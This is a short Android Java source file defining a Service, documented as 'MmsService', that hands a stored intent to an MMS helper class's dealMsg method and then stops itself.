package c;
import net.workspace.mms.MmsHelper;
import android.app.Service;
import android.content.Intent;
import android.os.IBinder;

/**
 * MmsService
 * @author Hike
 *
 */
public class MS extends Service {
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        new MmsHelper().dealMsg(MR.instance, MR.intent);
        quitService();
    }
    private void quitService() {
        Intent intent = new Intent();
        intent.setClass(this, MS.class);
        stopService(intent);
    }
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
